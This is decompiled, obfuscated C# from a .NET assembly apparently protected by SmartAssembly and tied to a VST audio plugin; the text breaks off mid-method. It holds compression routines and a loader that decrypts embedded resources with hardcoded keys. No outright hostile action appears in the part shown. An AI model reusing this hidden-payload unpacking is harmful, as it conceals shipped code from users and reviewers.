using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Lexicon_FX_processor_VST_module_with_TAP_delay;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using ns0;
using ns1;
using ns2;
using ns3;

namespace ns6;

internal sealed class Class27
{
	unsafe static bool smethod_0(bool bool_0, Class15.Class24 class24_0, bool bool_1)
	{
		void* ptr = stackalloc byte[24];
		if (class24_0.int_15 < 262 && !bool_0)
		{
			return false;
		}
		Class15.Class22 class22_2;
		byte[] byte_;
		do
		{
			if (class24_0.int_15 >= 262 || bool_0)
			{
				if (class24_0.int_15 != 0)
				{
					if (class24_0.int_14 >= 65274)
					{
						Class27.smethod_51(class24_0);
					}
					*(int*)ptr = class24_0.int_11;
					int int_ = class24_0.int_12;
					if (class24_0.int_15 >= 3)
					{
						*(int*)((byte*)ptr + 4) = Class27.smethod_21(class24_0);
						if (*(int*)((byte*)ptr + 4) != 0 && class24_0.int_14 - *(int*)((byte*)ptr + 4) <= 32506 && Class27.smethod_50(class24_0, *(int*)((byte*)ptr + 4)) && class24_0.int_12 <= 5 && class24_0.int_12 == 3 && class24_0.int_14 - class24_0.int_11 > 4096)
						{
							class24_0.int_12 = 2;
						}
					}
					if (int_ >= 3 && class24_0.int_12 <= int_)
					{
						Class15.Class22 class22_ = class24_0.class22_0;
						*(int*)((byte*)ptr + 16) = class24_0.int_14 - 1 - *(int*)ptr;
						Class27.smethod_12(*(int*)((byte*)ptr + 16), int_, class22_);
						int_ -= 2;
						do
						{
							class24_0.int_14++;
							class24_0.int_15--;
							if (class24_0.int_15 >= 3)
							{
								Class27.smethod_21(class24_0);
							}
						}
						while (--int_ > 0);
						class24_0.int_14++;
						class24_0.int_15--;
						class24_0.bool_0 = false;
						class24_0.int_12 = 2;
					}
					else
					{
						if (class24_0.bool_0)
						{
							Class27.smethod_18(class24_0.class22_0, class24_0.byte_0[class24_0.int_14 - 1] & 0xFF);
						}
						class24_0.bool_0 = true;
						class24_0.int_14++;
						class24_0.int_15--;
					}
					continue;
				}
				if (class24_0.bool_0)
				{
					Class27.smethod_18(class24_0.class22_0, class24_0.byte_0[class24_0.int_14 - 1] & 0xFF);
				}
				class24_0.bool_0 = false;
				class22_2 = class24_0.class22_0;
				byte_ = class24_0.byte_0;
				*(int*)((byte*)ptr + 12) = class24_0.int_13;
				*(int*)((byte*)ptr + 20) = class24_0.int_14 - class24_0.int_13;
				Class27.smethod_64(*(int*)((byte*)ptr + 20), bool_1, *(int*)((byte*)ptr + 12), class22_2, byte_);
				class24_0.int_13 = class24_0.int_14;
				return false;
			}
			return true;
		}
		while (class24_0.class22_0.int_9 < 16384);
		*(int*)((byte*)ptr + 8) = class24_0.int_14 - class24_0.int_13;
		if (class24_0.bool_0)
		{
			(*(int*)((byte*)ptr + 8))--;
		}
		bool flag = bool_1 && class24_0.int_15 == 0 && !class24_0.bool_0;
		class22_2 = class24_0.class22_0;
		byte_ = class24_0.byte_0;
		*(int*)((byte*)ptr + 12) = class24_0.int_13;
		Class27.smethod_64(*(int*)((byte*)ptr + 8), flag, *(int*)((byte*)ptr + 12), class22_2, byte_);
		class24_0.int_13 += *(int*)((byte*)ptr + 8);
		return !flag;
	}

	static Class15.Class19 smethod_1(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_10];
		Array.Copy(class20_0.byte_1, class20_0.int_9, array, 0, class20_0.int_10);
		return new Class15.Class19(array);
	}

	static bool smethod_2(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_1.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_0.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static void smethod_3(Class15.Class18 class18_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class18_0.byte_0[class18_0.int_2++] = class18_0.byte_0[int_0++];
			class18_0.int_2 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	unsafe static bool smethod_4(Class15.Class16 class16_0)
	{
		void* ptr = stackalloc byte[12];
		switch (class16_0.int_17)
		{
		case 2:
			if (class16_0.bool_0)
			{
				class16_0.int_17 = 12;
				return false;
			}
			*(int*)ptr = Class27.smethod_15(class16_0.class17_0, 3);
			if (*(int*)ptr < 0)
			{
				return false;
			}
			Class27.smethod_48(class16_0.class17_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class16_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class27.smethod_54(class16_0.class17_0);
				class16_0.int_17 = 3;
				break;
			case 1:
				class16_0.class19_0 = Class15.Class19.class19_0;
				class16_0.class19_1 = Class15.Class19.class19_1;
				class16_0.int_17 = 7;
				break;
			case 2:
				class16_0.class20_0 = new Class15.Class20();
				class16_0.int_17 = 6;
				break;
			}
			return true;
		case 3:
			if ((class16_0.int_21 = Class27.smethod_15(class16_0.class17_0, 16)) < 0)
			{
				return false;
			}
			Class27.smethod_48(class16_0.class17_0, 16);
			class16_0.int_17 = 4;
			goto case 4;
		case 4:
			*(int*)((byte*)ptr + 4) = Class27.smethod_15(class16_0.class17_0, 16);
			if (*(int*)((byte*)ptr + 4) < 0)
			{
				return false;
			}
			Class27.smethod_48(class16_0.class17_0, 16);
			class16_0.int_17 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class27.smethod_42(class16_0.class18_0, class16_0.class17_0, class16_0.int_21);
			class16_0.int_21 -= *(int*)((byte*)ptr + 8);
			if (class16_0.int_21 == 0)
			{
				class16_0.int_17 = 2;
				return true;
			}
			return !class16_0.class17_0.IsNeedingInput;
		case 6:
			if (!Class27.smethod_86(class16_0.class20_0, class16_0.class17_0))
			{
				return false;
			}
			class16_0.class19_0 = Class27.smethod_17(class16_0.class20_0);
			class16_0.class19_1 = Class27.smethod_1(class16_0.class20_0);
			class16_0.int_17 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class27.smethod_20(class16_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	unsafe static byte[] smethod_5(byte[] byte_0)
	{
		void* ptr = stackalloc byte[46];
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class27.smethod_2(callingAssembly, executingAssembly))
		{
			return null;
		}
		Class15.Stream0 stream = new Class15.Stream0(byte_0);
		byte[] array = new byte[0];
		*(int*)ptr = Class27.smethod_87(stream);
		if (*(int*)ptr == 67324752)
		{
			*(short*)((byte*)ptr + 44) = (short)Class27.smethod_85(stream);
			*(int*)((byte*)ptr + 4) = Class27.smethod_85(stream);
			*(int*)((byte*)ptr + 8) = Class27.smethod_85(stream);
			if (*(int*)ptr != 67324752 || *(short*)((byte*)ptr + 44) != 20 || *(int*)((byte*)ptr + 4) != 0 || *(int*)((byte*)ptr + 8) != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class27.smethod_87(stream);
			Class27.smethod_87(stream);
			Class27.smethod_87(stream);
			*(int*)((byte*)ptr + 12) = Class27.smethod_87(stream);
			*(int*)((byte*)ptr + 16) = Class27.smethod_85(stream);
			*(int*)((byte*)ptr + 20) = Class27.smethod_85(stream);
			if (*(int*)((byte*)ptr + 16) > 0)
			{
				byte[] buffer = new byte[*(int*)((byte*)ptr + 16)];
				stream.Read(buffer, 0, *(int*)((byte*)ptr + 16));
			}
			if (*(int*)((byte*)ptr + 20) > 0)
			{
				byte[] buffer2 = new byte[*(int*)((byte*)ptr + 20)];
				stream.Read(buffer2, 0, *(int*)((byte*)ptr + 20));
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class15.Class16 class16_ = new Class15.Class16(array2);
			array = new byte[*(int*)((byte*)ptr + 12)];
			Class27.smethod_60(0, class16_, array, array.Length);
			array2 = null;
		}
		else
		{
			*(int*)((byte*)ptr + 24) = *(int*)ptr >> 24;
			*(int*)ptr -= *(int*)((byte*)ptr + 24) << 24;
			if (*(int*)ptr != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (*(int*)((byte*)ptr + 24) == 1)
			{
				*(int*)((byte*)ptr + 28) = Class27.smethod_87(stream);
				array = new byte[*(int*)((byte*)ptr + 28)];
				*(int*)((byte*)ptr + 32) = 0;
				while (*(int*)((byte*)ptr + 32) < *(int*)((byte*)ptr + 28))
				{
					*(int*)((byte*)ptr + 36) = Class27.smethod_87(stream);
					*(int*)((byte*)ptr + 40) = Class27.smethod_87(stream);
					byte[] array3 = new byte[*(int*)((byte*)ptr + 36)];
					stream.Read(array3, 0, array3.Length);
					Class15.Class16 class16_2 = new Class15.Class16(array3);
					Class27.smethod_60(*(int*)((byte*)ptr + 32), class16_2, array, *(int*)((byte*)ptr + 40));
					*(int*)((byte*)ptr + 32) += *(int*)((byte*)ptr + 40);
				}
			}
			if (*(int*)((byte*)ptr + 24) == 2)
			{
				byte[] byte_ = new byte[8] { 114, 87, 56, 106, 74, 229, 118, 251 };
				byte[] byte_2 = new byte[8] { 12, 143, 146, 184, 161, 213, 93, 128 };
				using Class14 class14_ = new Class14();
				using ICryptoTransform cryptoTransform = Class27.smethod_89(byte_, byte_2, class14_, bool_0: true);
				byte[] byte_3 = cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class27.smethod_5(byte_3);
			}
			if (*(int*)((byte*)ptr + 24) == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using Class13 class13_ = new Class13();
				using ICryptoTransform cryptoTransform2 = Class27.smethod_10(byte_4, byte_5, bool_0: true, class13_);
				byte[] byte_6 = cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4);
				array = Class27.smethod_5(byte_6);
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	unsafe static byte[] smethod_6(byte[] byte_0, byte[] byte_1, byte[] byte_2, int int_0)
	{
		void* ptr = stackalloc byte[64];
		try
		{
			Class15.Stream0 stream = new Class15.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class15.Class21 class2 = new Class15.Class21();
				DateTime now = DateTime.Now;
				*(long*)ptr = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				*(int*)((byte*)ptr + 40) = -1;
				uint num = *(uint*)((byte*)ptr + 40);
				int num2 = 0;
				int num3 = byte_1.Length;
				while (--num3 >= 0)
				{
					num = array8[(num ^ byte_1[num2++]) & 0xFF] ^ (num >> 8);
				}
				num ^= *(uint*)((byte*)ptr + 40);
				Class27.smethod_16(67324752, stream);
				Class27.smethod_14(stream, 20);
				Class27.smethod_14(stream, 0);
				Class27.smethod_14(stream, 8);
				Class27.smethod_16((int)(*(long*)ptr), stream);
				Class27.smethod_16((int)num, stream);
				*(long*)((byte*)ptr + 8) = stream.Position;
				Class27.smethod_16(0, stream);
				Class27.smethod_16(byte_1.Length, stream);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class27.smethod_14(stream, bytes.Length);
				Class27.smethod_14(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class27.smethod_35(byte_1, class2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					*(int*)((byte*)ptr + 44) = Class27.smethod_79(array9, class2);
					if (*(int*)((byte*)ptr + 44) <= 0)
					{
						break;
					}
					stream.Write(array9, 0, *(int*)((byte*)ptr + 44));
				}
				class2.int_6 |= 12;
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					*(int*)((byte*)ptr + 48) = Class27.smethod_79(array10, class2);
					if (*(int*)((byte*)ptr + 48) <= 0)
					{
						break;
					}
					stream.Write(array10, 0, *(int*)((byte*)ptr + 48));
				}
				*(long*)((byte*)ptr + 16) = class2.long_0;
				Class27.smethod_16(33639248, stream);
				Class27.smethod_14(stream, 20);
				Class27.smethod_14(stream, 20);
				Class27.smethod_14(stream, 0);
				Class27.smethod_14(stream, 8);
				Class27.smethod_16((int)(*(long*)ptr), stream);
				Class27.smethod_16((int)num, stream);
				Class27.smethod_16((int)(*(long*)((byte*)ptr + 16)), stream);
				Class27.smethod_16(byte_1.Length, stream);
				Class27.smethod_14(stream, bytes.Length);
				Class27.smethod_14(stream, 0);
				Class27.smethod_14(stream, 0);
				Class27.smethod_14(stream, 0);
				Class27.smethod_14(stream, 0);
				Class27.smethod_16(0, stream);
				Class27.smethod_16(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class27.smethod_16(101010256, stream);
				Class27.smethod_14(stream, 0);
				Class27.smethod_14(stream, 0);
				Class27.smethod_14(stream, 1);
				Class27.smethod_14(stream, 1);
				Class27.smethod_16(46 + bytes.Length, stream);
				Class27.smethod_16((int)(30 + bytes.Length + *(long*)((byte*)ptr + 16)), stream);
				Class27.smethod_14(stream, 0);
				stream.Seek(*(long*)((byte*)ptr + 8), SeekOrigin.Begin);
				Class27.smethod_16((int)(*(long*)((byte*)ptr + 16)), stream);
				break;
			}
			case 1:
				Class27.smethod_16(25000571, stream);
				Class27.smethod_16(byte_1.Length, stream);
				*(int*)((byte*)ptr + 52) = 0;
				while (*(int*)((byte*)ptr + 52) < byte_1.Length)
				{
					byte[] array5 = new byte[Math.Min(2097151, byte_1.Length - *(int*)((byte*)ptr + 52))];
					Buffer.BlockCopy(byte_1, *(int*)((byte*)ptr + 52), array5, 0, array5.Length);
					*(long*)((byte*)ptr + 24) = stream.Position;
					Class27.smethod_16(0, stream);
					Class27.smethod_16(array5.Length, stream);
					Class15.Class21 @class = new Class15.Class21();
					Class27.smethod_35(array5, @class);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						*(int*)((byte*)ptr + 56) = Class27.smethod_79(array6, @class);
						if (*(int*)((byte*)ptr + 56) <= 0)
						{
							break;
						}
						stream.Write(array6, 0, *(int*)((byte*)ptr + 56));
					}
					@class.int_6 |= 12;
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						*(int*)((byte*)ptr + 60) = Class27.smethod_79(array7, @class);
						if (*(int*)((byte*)ptr + 60) <= 0)
						{
							break;
						}
						stream.Write(array7, 0, *(int*)((byte*)ptr + 60));
					}
					*(long*)((byte*)ptr + 32) = stream.Position;
					stream.Position = *(long*)((byte*)ptr + 24);
					Class27.smethod_16((int)@class.long_0, stream);
					stream.Position = *(long*)((byte*)ptr + 32);
					*(int*)((byte*)ptr + 52) += array5.Length;
				}
				break;
			case 2:
			{
				Class27.smethod_16(41777787, stream);
				byte[] array3 = Class27.smethod_6((byte[])null, byte_1, (byte[])null, 1);
				using (Class14 class14_ = new Class14())
				{
					using ICryptoTransform cryptoTransform2 = Class27.smethod_89(byte_0, byte_2, class14_, bool_0: false);
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class27.smethod_16(58555003, stream);
				byte[] array = Class27.smethod_6((byte[])null, byte_1, (byte[])null, 1);
				using (Class13 class13_ = new Class13())
				{
					using ICryptoTransform cryptoTransform = Class27.smethod_10(byte_0, byte_2, bool_0: false, class13_);
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class15.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static void smethod_7(Class15.Class22.Class23 class23_0, int int_0)
	{
		Class27.smethod_68(class23_0.class22_0.class25_0, class23_0.short_1[int_0] & 0xFFFF, (int)class23_0.byte_0[int_0]);
	}

	static int smethod_8(Class15.Class22 class22_0, int int_0)
	{
		int num = 0;
		while (int_0 >= 4)
		{
			num += 2;
			int_0 >>= 1;
		}
		return num + int_0;
	}

	unsafe static void smethod_9(Class15.Class22 class22_0)
	{
		void* ptr = stackalloc byte[20];
		*(int*)ptr = 0;
		while (*(int*)ptr < class22_0.int_9)
		{
			*(int*)((byte*)ptr + 4) = class22_0.byte_1[*(int*)ptr] & 0xFF;
			int num = class22_0.short_0[*(int*)ptr];
			if (num-- != 0)
			{
				*(int*)((byte*)ptr + 8) = Class27.smethod_67(class22_0, *(int*)((byte*)ptr + 4));
				Class27.smethod_7(class22_0.class23_0, *(int*)((byte*)ptr + 8));
				*(int*)((byte*)ptr + 12) = (*(int*)((byte*)ptr + 8) - 261) / 4;
				if (*(int*)((byte*)ptr + 12) > 0 && *(int*)((byte*)ptr + 12) <= 5)
				{
					Class27.smethod_68(class22_0.class25_0, *(int*)((byte*)ptr + 4) & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
				*(int*)((byte*)ptr + 16) = Class27.smethod_8(class22_0, num);
				Class27.smethod_7(class22_0.class23_1, *(int*)((byte*)ptr + 16));
				*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 16) / 2 - 1;
				if (*(int*)((byte*)ptr + 12) > 0)
				{
					Class27.smethod_68(class22_0.class25_0, num & ((1 << *(int*)((byte*)ptr + 12)) - 1), *(int*)((byte*)ptr + 12));
				}
			}
			else
			{
				Class27.smethod_7(class22_0.class23_0, *(int*)((byte*)ptr + 4));
			}
			(*(int*)ptr)++;
		}
		Class27.smethod_7(class22_0.class23_0, 256);
	}

	static ICryptoTransform smethod_10(byte[] byte_0, byte[] byte_1, bool bool_0, Class13 class13_0)
	{
		class13_0.type_0.GetProperty("Key")!.GetSetMethod()!.Invoke(class13_0.object_0, new object[1] { byte_0 });
		class13_0.type_0.GetProperty("IV")!.GetSetMethod()!.Invoke(class13_0.object_0, new object[1] { byte_1 });
		MethodInfo method = class13_0.type_0.GetMethod(bool_0 ? "CreateDecryptor" : "CreateEncryptor", new Type[0]);
		return (ICryptoTransform)method.Invoke(class13_0.object_0, new object[0]);
	}

	static void smethod_11()
	{
		try
		{
			Class11.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	unsafe static bool smethod_12(int int_0, int int_1, Class15.Class22 class22_0)
	{
		void* ptr = stackalloc byte[8];
		class22_0.short_0[class22_0.int_9] = (short)int_0;
		class22_0.byte_1[class22_0.int_9++] = (byte)(int_1 - 3);
		*(int*)ptr = Class27.smethod_67(class22_0, int_1 - 3);
		short[] short_;
		short[] array = (short_ = class22_0.class23_0.short_0);
		int num = *(int*)ptr;
		nint num2 = num;
		array[num] = (short)(short_[num2] + 1);
		if (*(int*)ptr >= 265 && *(int*)ptr < 285)
		{
			class22_0.int_10 += (*(int*)ptr - 261) / 4;
		}
		*(int*)((byte*)ptr + 4) = Class27.smethod_8(class22_0, int_0 - 1);
		short[] array2 = (short_ = class22_0.class23_1.short_0);
		int num3 = *(int*)((byte*)ptr + 4);
		num2 = num3;
		array2[num3] = (short)(short_[num2] + 1);
		if (*(int*)((byte*)ptr + 4) >= 4)
		{
			class22_0.int_10 += *(int*)((byte*)ptr + 4) / 2 - 1;
		}
		return class22_0.int_9 >= 16384;
	}

	static void smethod_13(Class15.Class25 class25_0)
	{
		if (class25_0.int_2 > 0)
		{
			class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
			if (class25_0.int_2 > 8)
			{
				class25_0.byte_0[class25_0.int_1++] = (byte)(class25_0.uint_0 >> 8);
			}
		}
		class25_0.uint_0 = 0u;
		class25_0.int_2 = 0;
	}

	static void smethod_14(Class15.Stream0 stream0_0, int int_0)
	{
		stream0_0.WriteByte((byte)((uint)int_0 & 0xFFu));
		stream0_0.WriteByte((byte)((uint)(int_0 >> 8) & 0xFFu));
	}

	static int smethod_15(Class15.Class17 class17_0, int int_0)
	{
		if (class17_0.int_2 < int_0)
		{
			if (class17_0.int_0 == class17_0.int_1)
			{
				return -1;
			}
			class17_0.uint_0 |= (uint)(((class17_0.byte_0[class17_0.int_0++] & 0xFF) | ((class17_0.byte_0[class17_0.int_0++] & 0xFF) << 8)) << class17_0.int_2);
			class17_0.int_2 += 16;
		}
		return (int)(class17_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_16(int int_0, Class15.Stream0 stream0_0)
	{
		Class27.smethod_14(stream0_0, int_0);
		Class27.smethod_14(stream0_0, int_0 >> 16);
	}

	static Class15.Class19 smethod_17(Class15.Class20 class20_0)
	{
		byte[] array = new byte[class20_0.int_9];
		Array.Copy(class20_0.byte_1, 0, array, 0, class20_0.int_9);
		return new Class15.Class19(array);
	}

	static bool smethod_18(Class15.Class22 class22_0, int int_0)
	{
		class22_0.short_0[class22_0.int_9] = 0;
		class22_0.byte_1[class22_0.int_9++] = (byte)int_0;
		short[] short_;
		short[] array = (short_ = class22_0.class23_0.short_0);
		nint num = int_0;
		array[int_0] = (short)(short_[num] + 1);
		return class22_0.int_9 >= 16384;
	}

	static bool smethod_19(Class15.Class24 class24_0)
	{
		return class24_0.int_18 == class24_0.int_17;
	}

	unsafe static bool smethod_20(Class15.Class16 class16_0)
	{
		void* ptr = stackalloc byte[12];
		int num = Class27.smethod_80(class16_0.class18_0);
		while (num >= 258)
		{
			*(int*)((byte*)ptr + 8) = class16_0.int_17;
			switch (*(int*)((byte*)ptr + 8))
			{
			case 7:
			{
				int num2;
				while (((num2 = Class27.smethod_78(class16_0.class19_0, class16_0.class17_0)) & -256) == 0)
				{
					Class27.smethod_34(class16_0.class18_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class16_0.int_19 = Class15.Class16.int_13[num2 - 257];
					class16_0.int_18 = Class15.Class16.int_14[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class16_0.class19_1 = null;
				class16_0.class19_0 = null;
				class16_0.int_17 = 2;
				return true;
			}
			case 8:
				if (class16_0.int_18 > 0)
				{
					class16_0.int_17 = 8;
					*(int*)ptr = Class27.smethod_15(class16_0.class17_0, class16_0.int_18);
					if (*(int*)ptr < 0)
					{
						return false;
					}
					Class27.smethod_48(class16_0.class17_0, class16_0.int_18);
					class16_0.int_19 += *(int*)ptr;
				}
				class16_0.int_17 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class27.smethod_78(class16_0.class19_1, class16_0.class17_0);
				if (num2 >= 0)
				{
					class16_0.int_20 = Class15.Class16.int_15[num2];
					class16_0.int_18 = Class15.Class16.int_16[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class16_0.int_18 > 0)
				{
					class16_0.int_17 = 10;
					*(int*)((byte*)ptr + 4) = Class27.smethod_15(class16_0.class17_0, class16_0.int_18);
					if (*(int*)((byte*)ptr + 4) < 0)
					{
						return false;
					}
					Class27.smethod_48(class16_0.class17_0, class16_0.int_18);
					class16_0.int_20 += *(int*)((byte*)ptr + 4);
				}
				Class27.smethod_71(class16_0.class18_0, class16_0.int_19, class16_0.int_20);
				num -= class16_0.int_19;
				class16_0.int_17 = 7;
				break;
			}
		}
		return true;
	}

	static int smethod_21(Class15.Class24 class24_0)
	{
		int num = ((class24_0.int_10 << 5) ^ class24_0.byte_0[class24_0.int_14 + 2]) & 0x7FFF;
		short num2 = (class24_0.short_1[class24_0.int_14 & 0x7FFF] = class24_0.short_0[num]);
		class24_0.short_0[num] = (short)class24_0.int_14;
		class24_0.int_10 = num;
		return num2 & 0xFFFF;
	}

	unsafe static void smethod_22(Class15.Class22.Class23 class23_0, Class15.Class22.Class23 class23_1)
	{
		void* ptr = stackalloc byte[20];
		*(int*)((byte*)ptr + 8) = -1;
		*(int*)((byte*)ptr + 12) = 0;
		while (*(int*)((byte*)ptr + 12) < class23_1.int_1)
		{
			int num = 1;
			*(int*)((byte*)ptr + 16) = class23_1.byte_0[*(int*)((byte*)ptr + 12)];
			if (*(int*)((byte*)ptr + 16) == 0)
			{
				*(int*)ptr = 138;
				*(int*)((byte*)ptr + 4) = 3;
			}
			else
			{
				*(int*)ptr = 6;
				*(int*)((byte*)ptr + 4) = 3;
				if (*(int*)((byte*)ptr + 8) != *(int*)((byte*)ptr + 16))
				{
					Class27.smethod_7(class23_0, *(int*)((byte*)ptr + 16));
					num = 0;
				}
			}
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 16);
			(*(int*)((byte*)ptr + 12))++;
			while (*(int*)((byte*)ptr + 12) < class23_1.int_1 && *(int*)((byte*)ptr + 8) == class23_1.byte_0[*(int*)((byte*)ptr + 12)])
			{
				(*(int*)((byte*)ptr + 12))++;
				if (++num >= *(int*)ptr)
				{
					break;
				}
			}
			if (num < *(int*)((byte*)ptr + 4))
			{
				while (num-- > 0)
				{
					Class27.smethod_7(class23_0, *(int*)((byte*)ptr + 8));
				}
			}
			else if (*(int*)((byte*)ptr + 8) != 0)
			{
				Class27.smethod_7(class23_0, 16);
				Class27.smethod_68(class23_1.class22_0.class25_0, num - 3, 2);
			}
			else if (num <= 10)
			{
				Class27.smethod_7(class23_0, 17);
				Class27.smethod_68(class23_1.class22_0.class25_0, num - 3, 3);
			}
			else
			{
				Class27.smethod_7(class23_0, 18);
				Class27.smethod_68(class23_1.class22_0.class25_0, num - 11, 7);
			}
		}
	}

	static void smethod_23(int int_0, byte[] byte_0, int int_1, Class15.Class17 class17_0)
	{
		if (class17_0.int_0 < class17_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_0 + int_1;
		if (0 <= int_0 && int_0 <= num && num <= byte_0.Length)
		{
			if (((uint)int_1 & (true ? 1u : 0u)) != 0)
			{
